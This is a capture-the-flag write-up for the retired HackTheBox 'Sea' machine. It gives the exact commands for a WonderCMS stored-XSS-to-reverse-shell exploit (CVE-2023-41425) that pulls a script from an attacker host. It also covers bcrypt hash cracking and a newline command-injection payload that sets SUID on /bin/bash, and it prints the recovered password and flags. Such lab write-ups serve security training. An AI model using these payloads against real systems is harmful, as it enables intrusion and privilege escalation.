# Sea — HackTheBox

| Field | Detail |
|---|---|
| OS | Linux |
| Difficulty | Easy |
| IP | 10.129.34.221 |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/sea](https://jostif.pages.dev/writeups/sea) |

**Techniques:** WonderCMS version fingerprint → CVE-2023-41425 (stored XSS → RCE via theme install) → bcrypt crack (hashcat -m 3200) → password reuse SSH → internal service port forward → command injection (newline) → SUID bash → root

---

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Foothold — WonderCMS RCE (CVE-2023-41425)](#foothold)
4. [What Didn't Work & Why](#what-didnt-work)
5. [Shell Stabilization](#shell-stabilization)
6. [Lateral Movement — Cracking the Hash](#lateral-movement)
7. [Privilege Escalation — Log Injection via Internal Service](#privilege-escalation)
8. [Root Flag](#root-flag)
9. [Key Takeaways](#key-takeaways)

---

## 1. Reconnaissance

Start with a full port scan:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.34.221
```

**Results:**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Only two ports — SSH and HTTP. Add the hostname to `/etc/hosts`:

```bash
echo "10.129.34.221 sea.htb" | sudo tee -a /etc/hosts
```

> **Beginner tip:** Always add the IP to `/etc/hosts` with the machine hostname. HTB machines often use virtual hosting and will return different content when accessed by hostname vs IP.

---

## 2. Web Enumeration

### Directory Fuzzing

```bash
ffuf -u http://sea.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -fs 199
```

**Found:**
- `/themes` → 301
- `/data` → 301
- `/plugins` → 301
- `/messages` → 301

### Theme Enumeration

Browsing to `/themes/` revealed a `bike` theme. Fuzzing deeper:

```bash
ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
```

**Found:**
- `/themes/bike/README.md` → reveals **WonderCMS** bike theme by turboblack
- `/themes/bike/version` → returns `3.2.0`

```bash
curl -s http://sea.htb/themes/bike/README.md
curl -s http://sea.htb/themes/bike/version
```

### Identifying the CMS

The README confirms this is **WonderCMS**. Combined with version `3.2.0`, we can search for known vulnerabilities.

> **Beginner tip:** Always read `README.md`, `CHANGELOG`, and `version` files when you find a theme or plugin directory. They often reveal the CMS name and exact version number, which you can then search for CVEs.

### Finding the Login Page

WonderCMS uses a custom login URL defined in its config. The typical format is `/?loginURL`:

```bash
curl -s "http://sea.htb/?loginURL" -o /dev/null -w "%{http_code}"
# Returns: 200
```

Confirmed — the admin login is at `http://sea.htb/?loginURL`.

---

## 3. Foothold — WonderCMS RCE (CVE-2023-41425)

### Vulnerability Overview

CVE-2023-41425 is a **stored XSS leading to RCE** in WonderCMS ≤ 4.3.2. The attack chain:

1. Inject a malicious `<script>` tag into the contact form's `website` field
2. An admin bot periodically reviews submissions and renders the URL in HeadlessChrome
3. The script executes in the admin's authenticated browser context
4. The script uses the admin's session token to call WonderCMS's `installModule` API
5. A malicious zip (containing a PHP reverse shell) is installed as a theme
6. The reverse shell is triggered to call back to our listener

### Setting Up the Exploit

We used the exploit from: https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE

```bash
git clone https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE
cd CVE-2023-41425-wonderCMS_RCE
```

> **Important:** The original exploit at `prodigiousMind/CVE-2023-41425` pulls the reverse shell zip from GitHub, which doesn't work on HTB machines since they have no outbound internet access. The `thefizzyfish` fork hosts the zip locally.

Run the exploit:

```bash
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.78 -lport 9001 -sport 8000
```

This generates `xss.js` and an XSS delivery URL, and starts an HTTP server on port 8000.

### Delivering the Payload

Set up your listener:

```bash
nc -lvnp 9001
```

The exploit prints the XSS URL to send. Submit it via the contact form at `http://sea.htb/contact.php`:

```bash
curl -s -X POST http://sea.htb/contact.php \
  -d 'name=john&email=john@test.com&age=25&country=US' \
  --data-urlencode 'website=http://sea.htb/loginURL/index.php?page=loginURL?"></form><script src="http://10.10.14.78:8000/xss.js"></script><form action="'
```

The form must return **"Form submitted successfully!"** — if it says "Failed to submit", reset the machine and try again immediately after reset.

Wait 1–2 minutes. You will see the admin bot (HeadlessChrome) fetch `xss.js` then `shell.zip`:

```
10.129.37.82 - "GET /xss.js HTTP/1.1" 200
10.129.37.82 - "GET /shell.zip HTTP/1.1" 200
```

Then the reverse shell connects:

```
connect to [10.10.14.78] from (UNKNOWN) [10.129.37.82]
www-data@sea:/var/www/sea/themes/shell$
```

---

## 4. What Didn't Work & Why

This section covers the debugging process — understanding failures is as important as the solution.

### Problem 1: "Failed to submit form"

The contact form at `sea.htb/contact.php` intermittently returns "Failed to submit form. Please try again later." This is caused by a `mail()` call in the PHP backend that fails when no mail server is configured. The form sometimes stores submissions even when failing, but it's unreliable.

**Fix:** Reset the machine. The form works cleanly on a fresh instance. Submit immediately after the machine comes up.

### Problem 2: Wrong login URL

Initially we assumed the login URL was `http://sea.htb/loginURL` (no query string). This returns 404.

**Fix:** WonderCMS login is at `http://sea.htb/?loginURL` (with query string format).

### Problem 3: `xss.js` crashing silently

The original exploit's `xss.js` uses:
```javascript
var token = document.querySelectorAll('[name="token"]')[0].value;
```
But `/?loginURL` page (when unauthenticated) has no token element, so `.value` throws a TypeError and the script crashes before making any requests.

The correct behavior: since the admin is already logged in, fetching `/?loginURL` with their session returns the authenticated admin panel which **does** contain the token. The `thefizzyfish` fork handles this correctly by fetching the page first, then extracting the token from the response.

### Problem 4: GitHub zip URL in `installModule`

The original exploit's `xss.js` points `installModule` to `https://github.com/prodigiousMind/revshell/...`. HTB machines have no outbound internet access, so this silently fails.

**Fix:** Host `main.zip`/`shell.zip` locally and serve it via `python3 -m http.server`.

### Problem 5: Admin bot behavior

We initially thought the admin bot visited the submitted `website` URL directly (like curl). Testing confirmed it uses **HeadlessChrome** — a real browser that executes JavaScript. The XSS injection must be in a page that gets rendered by Chrome, not just fetched.

The correct attack: the admin bot visits the WonderCMS admin panel to review contact form submissions. The `website` field is rendered as HTML, executing our injected `<script>` tag.

---

## 5. Shell Stabilization

Upgrade the basic reverse shell to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Or simply SSH in as `amay` once you have credentials (see next section).

---

## 6. Lateral Movement — Cracking the Hash

### Finding the Hash

WonderCMS stores its config in `/var/www/sea/data/database.js`:

```bash
cat /var/www/sea/data/database.js
```

Inside:
```json
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q"
```

This is a **bcrypt** hash (`$2y$` prefix = PHP bcrypt, cost factor 10).

### Cracking with Hashcat

```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

> **Beginner tip:** bcrypt (mode 3200) is intentionally slow to crack. On CPU only, expect ~100 H/s. On a GPU it's much faster. Always try rockyou first — many HTB machines use simple passwords.

### Password Reuse → SSH Access

```bash
ssh amay@sea.htb
# Password: mychemicalromance
```

```bash
cat ~/user.txt
# 5f6872293e53cf4d86bd2685cbdb924d
```

---

## 7. Privilege Escalation — Log Injection via Internal Service

### Discovering the Internal Service

```bash
ss -tlnp
```

Output shows port **8080** listening on localhost only:
```
LISTEN  127.0.0.1:8080
```

### Port Forwarding

Forward port 8080 to your local machine via SSH:

```bash
ssh -L 8080:127.0.0.1:8080 amay@sea.htb
```

Visit `http://127.0.0.1:8080` in a browser. It prompts for HTTP Basic Auth. Use `amay:mychemicalromance`.

The app is a **System Monitor (Developing)** tool with:
- Disk usage display
- System management buttons (clean apt, update, clear logs)
- **Analyze Log File** — lets you select `access.log` or `auth.log` and analyze it

### Identifying the Injection Point

The "Analyze Log File" feature passes the selected log file path to a shell command (likely `grep` or similar) unsanitized. We can inject additional commands using a newline (`\n`) in the `log_file` parameter.

Testing:
```bash
curl -s http://127.0.0.1:8080 -u amay:mychemicalromance -X POST \
  --data-urlencode $'log_file=/var/log/apache2/access.log\nid' \
  -d 'analyze_log='
```

The newline splits the filename into two shell commands. The app runs the log file path as part of a shell command, executing both lines.

### Exploiting for Root

Set the SUID bit on `/bin/bash` to give any user a root shell:

```bash
curl -s http://127.0.0.1:8080 -u amay:mychemicalromance -X POST \
  --data-urlencode $'log_file=/var/log/apache2/access.log\nchmod +s /bin/bash' \
  -d 'analyze_log='
```

Verify:
```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

The `s` in the permissions confirms SUID is set.

> **Beginner tip:** When `/bin/bash` has the SUID bit set and is owned by root, running `bash -p` gives you an effective UID of root. The `-p` flag tells bash not to drop privileges on startup.

---

## 8. Root Flag

```bash
bash -p
whoami
# root
cat /root/root.txt
# c1e095b93cbb006e18a2b02fd5674352
```

---

## 9. Key Takeaways

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Full port scan | nmap |
| Enumeration | Directory + file fuzzing | ffuf |
| CMS identification | README/version files | curl |
| Foothold | Stored XSS → RCE via theme install | CVE-2023-41425 |
| Credential extraction | CMS database file | cat |
| Hash cracking | bcrypt wordlist attack | hashcat -m 3200 |
| Lateral movement | Password reuse | ssh |
| PrivEsc discovery | Internal service enumeration | ss -tlnp |
| PrivEsc | Command injection via log file parameter | curl POST injection |
| Root | SUID bash | bash -p |

### Lessons Learned

1. **Always check theme/plugin directories for version info** — `README.md` and `version` files reveal the exact CMS version.
2. **HTB machines have no internet access** — any exploit that fetches payloads from GitHub will silently fail. Always host payloads locally.
3. **"Failed to submit" doesn't always mean failure** — the backend may still process/store the submission even if the UI shows an error.
4. **HeadlessChrome bots execute JavaScript** — XSS attacks against bots work if the bot uses a real browser engine.
5. **Internal services are goldmines** — always run `ss -tlnp` or `netstat -tlnp` after getting a shell to find services only accessible from localhost.
6. **Newline injection (`\n`)** bypasses simple sanitization in shell commands. When a filename is passed to a shell command unsanitized, injecting `\n` effectively adds a second command.
7. **SUID bash is a reliable privesc** — if you can run commands as root but can't get a shell directly, `chmod +s /bin/bash` followed by `bash -p` is a clean path to root.
